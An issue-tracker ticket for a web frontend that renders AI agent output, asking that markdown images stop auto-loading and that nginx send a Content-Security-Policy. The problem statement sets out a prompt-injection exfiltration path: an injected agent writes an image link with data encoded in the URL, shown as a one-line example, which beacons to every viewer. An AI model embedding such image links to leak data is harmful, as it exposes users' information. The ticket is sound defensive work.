---
id: "9m8dn"
title: Do not auto-load remote images from agent-written markdown; add a Content-Security-Policy
status: done
priority: P2
created: "2026-09-21T10:52:37.346455050Z"
updated: "2026-09-21T18:14:10.207372609Z"
tags:
  - frontend
  - infra
  - technical-review
  - security
parent: "579dz"
attempts: 1
---

Problem: components/Markdown.tsx calls agent output and comments "untrusted text" but has no `img` override, so with react-markdown 10 defaults `![x](https://host/p?d=...)` in an assistant message, task description, comment or hand-off note becomes a live <img>. The operator's browser issues the GET the moment the row renders (callers: session/messages/AssistantText, tasks/CommentList, HandoffPanel, TaskDetail). A prompt-injected agent gets a zero-click beacon and exfiltration channel to every user who views the task or session — their IP plus whatever it encoded in the URL — even when the session container's own egress is restricted. No Content-Security-Policy is sent from nginx/, index.html or the orchestrator. Links are already safe (defaultUrlTransform strips javascript:, the `a` override sets rel="noopener noreferrer"), there is no rehype-raw and no dangerouslySetInnerHTML in the application.

Acceptance: markdown images never load without a user action: render them as a plain link or a click-to-load placeholder, or disallow the element; same-origin/data images may stay if there is a use for them. nginx sends a CSP proportionate to the app (`default-src 'self'`, `img-src 'self' data:`, `connect-src 'self'` plus the ws/wss origin, style allowances Tailwind and xterm need, nothing that breaks the Vite dev server), verified against the terminal, the diff view and the lazy chunks. A unit test asserts no <img> with a remote src is produced; an E2E or nginx-level check asserts the header. Document the policy in README.md (operation) and ARCHITECTURE.md (security posture); note that the access token's localStorage mirror is mandated by SPEC.md, so the CSP is the second layer for it as well.

References: frontend/src/components/Markdown.tsx; nginx/default.conf.template; frontend/index.html. Contract: SPEC.md, "Frontend"; ARCHITECTURE.md; ADR 0027 (agent output is displayed unredacted, which is why it must not be able to make requests).